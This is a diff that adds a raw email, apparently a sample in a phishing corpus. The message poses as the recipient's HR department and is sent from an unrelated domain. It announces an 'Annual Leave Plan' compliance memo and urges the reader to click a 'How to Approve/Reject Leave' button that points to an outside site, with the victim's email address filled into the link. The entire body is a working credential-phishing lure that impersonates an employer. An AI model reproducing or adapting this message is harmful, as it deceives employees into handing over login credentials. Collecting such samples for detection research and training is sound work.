@@ -1,0 +1,158 @@
+Return-Path: bounce+689367.6a2cfea-jose=monkey.org@maxilimamall.com
+Delivered-To: jose@monkey.org
+X-FDA: 83331807930.35.577CCAC
+Received: from m42-3.mailgun.net (m42-3.mailgun.net [69.72.42.3])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id 1008980003
+	for <jose@monkey.org>; Mon, 14 Apr 2025 07:25:17 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=pass header.d=maxilimamall.com header.s=smtp header.b=Vk77SabK;
+	spf=pass (imf11.b.hostedemail.com: domain of "bounce+689367.6a2cfea-jose=monkey.org@maxilimamall.com" designates 69.72.42.3 as permitted sender) smtp.mailfrom="bounce+689367.6a2cfea-jose=monkey.org@maxilimamall.com";
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1744615518;
+	h=from:from:sender:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=62l7tlFRGezdIe+qdBWMbLr5CGhsZriJaf11BOkj51U=;
+	b=Ye3ty0zXT6HVYlK+2E9tJrmanoJalEmVmtzCIL3nMRgvMemq/s501wCt7qXHJRqnUpuYWP
+	sDNfjFmnAJtHSw1zdqkuBkbgx7aDtAo7vE6vDUr29irhyA/eqbYYgHTwgcie591Wn9/+L7
+	ro/bAPbwxhZ4En8h+b2K9vZISlv+FPU=
+ARC-Authentication-Results: i=1;
+	imf11.b.hostedemail.com;
+	dkim=pass header.d=maxilimamall.com header.s=smtp header.b=Vk77SabK;
+	spf=pass (imf11.b.hostedemail.com: domain of "bounce+689367.6a2cfea-jose=monkey.org@maxilimamall.com" designates 69.72.42.3 as permitted sender) smtp.mailfrom="bounce+689367.6a2cfea-jose=monkey.org@maxilimamall.com";
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1744615518; a=rsa-sha256;
+	cv=none;
+	b=AORZljr0TTCmkpNcD3LnXwfRGC31J5puAVuR4/k9Sc1WQogOgKX6VvxkH8Hwz0dpZqAadd
+	yeXRTyZKeX+yNo9fCt5Kwf/EqOAg3GtMYT4QvLi6vQOdVhRaDwosdjcZTetSkzq3CZebII
+	gP0cVR8HEklu7MeKkyj8xaPMAs7L1i4=
+DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=maxilimamall.com; q=dns/txt; s=smtp; t=1744615516; x=1744622716;
+ h=Content-Transfer-Encoding: Content-Type: MIME-Version: Message-ID: Date: Subject: Subject: To: To: From: From: Sender: Sender;
+ bh=62l7tlFRGezdIe+qdBWMbLr5CGhsZriJaf11BOkj51U=;
+ b=Vk77SabKXYRDbSHRO8Z550em6VpGmit3efwhQeLtsod/Gi4Nz7ATAo+fnEUBgi+kYEBK8kf/SXorUNr0VjSVwG0Cc8vaNUHzJetyF0CXqK5arJudeGQmSEnRWtWzW4SedtX0QRUB7b0BYj/pnr4pe3Q/DU+RCZaIq3mxfWTlzso=
+X-Mailgun-Sending-Ip: 69.72.42.3
+X-Mailgun-Sending-Ip-Pool-Name: 
+X-Mailgun-Sending-Ip-Pool: 
+X-Mailgun-Sid: WyIzNGY2ZCIsImpvc2VAbW9ua2V5Lm9yZyIsIjZhMmNmZWEiXQ==
+Received: from 107-172-75-155-host.colocrossing.com
+ (107-172-75-155-host.colocrossing.com [107.172.75.155]) by be624fb8e330 with
+ SMTP id 67fcb85c7082cba95abbfa3d; Mon, 14 Apr 2025 07:25:16 GMT
+Sender: hr@maxilimamall.com
+From: HR Department-Monkey<hr@maxilimamall.com>
+To: jose@monkey.org
+Subject: Director of Human Resources
+Date: 14 Apr 2025 00:25:15 -0700
+Message-ID: <20250414002515.79FB3849D79F088D@maxilimamall.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=6.08
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 1008980003
+X-Stat-Signature: 9wk59eqi8uy31jxfks86jtyzfxo9j1ir
+X-Rspam-User: 
+X-HE-Tag: 1744615517-885190
+X-HE-Meta: U2FsdGVkX1/FDsoG1+5cXAJ0sq9DJv2+s6KBkN+aElaByTF1704OM+D4xIYzBpDyElQUK3YGW2gmYHNwezsVqGSE/tFNb2FKECQT/OCzyHaTaMMWa7HnNmpQVW4op2d3SiXW+OZAQfn+Ho8ZLl0b/r8Qfw9ExAuBieziua5obFrAK2ei56LhN/35nFVIY6P1UK+y6RDGLoH5u2GZsI/gdbrKRQqL7z7EHSLqcS189YVdC3KIYacJGYZyfzSZ4e8/O7m1MoE1oZkw8bEqdoi7k56mjbIIrdbDVpBMNcFaHL3uCAVMfuw0GbGCBD3rnv8Iyat1bNgh1NusffuGUSGIgEg755Y0w8kYGgRi27itQpl05wMR+rDA7SbWdAqXax+UrQ5w26YYaBCn30jUGigmVz0xeTBjByo3eb0ot5VNxk4jGQZmSyQUEaJwCo+FRAri24nMP45pKZ0seIWoUSRmwFIe1RrSAL//7T8X1H2tdOFzi5wAI13mpax9IAnW86fOotNRwsnLq9mIQWm/SMP70aYyZchCUKQv0GWBG0zU4wrmqbExv+n6x3B//aaOMXEN5RqgTQ41mOFWECt1wW8xlhbqNnTcLwXyn2a5HkuteUFbEtd0DoKr8xjd6tBUfU/vB4RGVndRc3rhzaa8jQQIPuJ/PXnGBOsqF0AEGjh0WaXieGGcmSTHNx2PLsZbJarknSw8M9tzDVCRNnQCBmu4IoXbevbLw5Ye+IOKfQZGc6VM2sbOLm1XG1Lbk80TEorg2k70sugocp8FRa4iYmZbnBmedXBmickb4ie2Qx1BZjvEedRuOtOXipxaue9GiLRwjZYQotfbFNZ4vgf61qZDo0yVnn0A0o9xqW/zPNGFxRGQtqsDXjnwiNRhjUrTZ4SPEU7m63EA6Bv+toNRrz6sjbhtLj29oNJ45yd26MexQyP24Fjn7ZsLH6eBp6rwsVpkGOYUs4GGptAv6JMC9j3/9hwxDk9
+ 69nws7eHZnvDCVbN9OKoTJUcHipvaa1nUSKf3+qtYFmgKm2n5Kxgv0zhDi+at6wVxtNq8CQhzTqu+YnAHldhF6JHuCb5Fhqzk/WkmoPDK/Cn6Gdd8x6IS3Ze2qwzIHwVI0+NX+E8sKsTzR0h6H0UgNT8Lj+WH8tvHVrS8xB2b9EsC0a+hBN6n3T58w5m8pZ9wCKAgVn+g8dFLYoixJ1NH1dulzocI46CF7SG2rhzXR16kCKKxuXe3pcgH4gajEmay7R3RxWNa2IKm0IfrogXJAc05t3pAh254454TYAaBZETXitAJ6GNAUd4Z80T64VJubmPdT9+6XHgdYBmpMxoHJ2Ql2HTSvVO6Vw1Pk7sUx90J81Eg4STgFP9PzHMwMPSc3+s0WwWX6voxQsPt82YMqkmykfCQ2OcTSmdPGdnuUmYOXD0lQdD7NlQrYD87gGiz3rhisJ3ejQFPu0RqXUtGmtlpvORJHu+04+QD+A0uPXUsVn7gtegR6UgyjrY1dIXiwAab61hA2kUxYGU/0cSzjW5buWu7KTqrI13ReAMYiTF4cWT3aLxtC8VGVsro9XtlgU9Y73Li12AXUr57lNn0PWSBlA==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 151
+
+<html><head><meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"><met=
+a name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head><body>
+<table style=3D'border: 1px solid currentColor; border-image: none; width: =
+800px; color: rgb(51, 51, 51); text-transform: none; text-indent: 0px; lett=
+er-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helvetica=
+, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; word-s=
+pacing: 0px; white-space: normal; border-collapse: collapse; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-style:=20
+initial; text-decoration-color: initial;'><tbody><tr><td style=3D"margin: 0=
+px; width: 796px; color: rgb(241, 240, 255); padding-bottom: 5px; backgroun=
+d-color: rgb(68, 50, 102);"><table style=3D"font-family: Verdana;"><tbody><=
+tr><td style=3D"margin: 0px;"><table><tbody><tr style=3D"vertical-align: bo=
+ttom;"><td style=3D"margin: 0px; vertical-align: bottom;" colspan=3D"2">
+<div style=3D"padding: 5px 0px; font-size: 20px; font-weight: bold; vertica=
+l-align: bottom; border-top-color: currentColor; border-top-width: 0px; bor=
+der-top-style: none; display: table-cell;">Monkey</div></td></tr></tbody></=
+table></td></tr></tbody></table></td></tr><tr><td style=3D"margin: 0px;"><d=
+iv style=3D"padding: 5px; color: rgb(125, 34, 82); font-family: Verdana; fo=
+nt-size: 18px; font-weight: bold; border-top-color: currentColor; border-to=
+p-width: 0px; border-top-style: none;">
+<font color=3D"#1f497d" size=3D"3">Requested by &nbsp;: HR Department<br>Po=
+sition &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; : Director of Human Resources</fo=
+nt><font color=3D"#1f497d"><br><p></p><div style=3D'color: rgb(33, 33, 33);=
+ font-family: wf_segoe-ui_normal,"Segoe UI","Segoe WP",Tahoma,Arial,sans-se=
+rif,serif,EmojiFont; font-size: 15px;'><p style=3D'font-family: "Times New =
+Roman",serif; font-size: 12pt; margin-right: 0px; margin-bottom: 12pt; marg=
+in-left: 0px;'>
+<span style=3D"border-color: windowtext; padding: 0px; color: rgb(32, 56, 1=
+00); font-family: Calibri,sans-serif,serif,EmojiFont; font-size: 11pt; bord=
+er-right-width: 1pt; border-bottom-width: 1pt; border-left-width: 1pt;" 42p=
+x;=3D"" #0078d7;=3D"" 52px;=3D"" 0px=3D"" 20px;?=3D""><span></span></span><=
+/p><p><span style=3D"font-family: verdana, serif, EmojiFont; font-size: 11p=
+t;"><span sans-serif"=3D"" geneva,=3D"" stylefont-family:verdana,=3D"">Leav=
+e Application #00000723 (Approved)<br></span></span></p></div></font>
+</div></td></tr></tbody></table><br style=3D"color: rgb(34, 34, 34); text-t=
+ransform: none; text-indent: 0px; letter-spacing: normal; font-family: Aria=
+l, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight=
+: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-=
+variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-w=
+idth: 0px; text-decoration-style: initial; text-decoration-color: initial;"=
+>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-styl=
+e: initial; text-decoration-color: initial;">
+<p class=3D"MsoNormal" style=3D"margin: 0in; color: rgb(51, 51, 51); font-f=
+amily: Calibri, sans-serif; font-size: 11pt;"><span lang=3D"EN-US" style=3D=
+"color: rgb(31, 73, 125);">Hello jose@monkey.org </span></p><p><span style=
+=3D"font-family: verdana, serif, EmojiFont; font-size: 11pt;"><span style=
+=3D"font-family: verdana, geneva, sans-serif;">Kindly check the staff memo,=
+ <span style=3D"color: rgb(51, 102, 255);"></span>
+referring to the above subject from HR department regarding low compliance =
+to the Annual Vacation Plan for year 2025/2026.<br></span></span><ul type=
+=3D"disc" style=3D'color: rgb(51, 51, 51); font-family: "Lucida Grande", Ve=
+rdana, Arial, Helvetica, sans-serif; font-size: 11px; margin-top: 0in; marg=
+in-bottom: 0in;'>
+<a style=3D'margin: 0px; padding: 15px 20px; border-radius: 25px; border: 0=
+px currentColor; border-image: none; text-align: center; color: rgb(255, 25=
+5, 255); line-height: inherit; font-family: "fakt pro medium", "segoe ui", =
+"sanfrancisco display", arial, sans-serif; font-size: 14px; font-variant: i=
+nherit; font-weight: inherit; vertical-align: baseline; display: block; fon=
+t-stretch: inherit; background-color: rgb(64, 159, 255); text-decoration-li=
+ne: none;'=20
+href=3D"https://altech-process.com/?email=3Djose@monkey.org" target=3D"_bla=
+nk" rel=3D"noopener noreferrer">How to Approve/Reject Leave</a><div><br></d=
+iv></ul><p class=3D"MsoNormal" style=3D"margin: 0in; color: rgb(51, 51, 51)=
+; font-family: Calibri, sans-serif; font-size: 11pt;">Please do note: that =
+all names highlighted in red are those who are yet to comply to the Annual =
+Leave Plan for 2025/2026.<br><br>
+Names of employees marked in Green colour have meet all the requirements fo=
+r the upcoming 2025/2026 Annual Leave Plan.<br><br><span style=3D"font-fami=
+ly: verdana, geneva,sans-serif; font-size: 11pt;"></span><p style=3D"margin=
+: 0in;"><b><i><span style=3D'color: rgb(0, 112, 192); font-family: "Bookman=
+ Old Style",serif,serif,EmojiFont; font-size: 12pt;'><font style=3D'font-fa=
+mily: "Bodoni MT Black",serif,EmojiFont;'>Thanks &amp; Regards,</font></spa=
+n></i></b></p><p style=3D"margin: 0in;"><b>
+<span style=3D'color: rgb(0, 112, 192); font-family: "Bookman Old Style",se=
+rif,serif,EmojiFont; font-size: 12pt;'><font size=3D"2" style=3D"font-famil=
+y: Arial,serif,EmojiFont;">Monkey&nbsp;Human Resources</font></span></b></p=
+><p style=3D"margin: 0in;"><b><span style=3D"color: rgb(0, 112, 192);">HR&n=
+bsp;Manager</span></b></p><p class=3D"MsoNormal" style=3D"margin: 0in; colo=
+r: rgb(51, 51, 51); font-family: Calibri, sans-serif; font-size: 11pt;"><br=
+></p>
+<p class=3D"MsoNormal" style=3D"margin: 0in; color: rgb(51, 51, 51); font-f=
+amily: Calibri, sans-serif; font-size: 11pt;"><span lang=3D"EN-US" style=3D=
+"color: rgb(31, 73, 125);"><span style=3D"color: rgb(128, 128, 128); font-f=
+amily: Arial, sans-serif; font-size: 8px;">
+DISCLAIMER: This e-mail is strictly confidential and is intended for the na=
+med addressee only. If you are not the intended recipient, it may be unlawf=
+ul for you to read, copy, distribute or otherwise use this information and =
+you should delete the e-mail from your systems.</span></span></p></div></bo=
+dy></html>
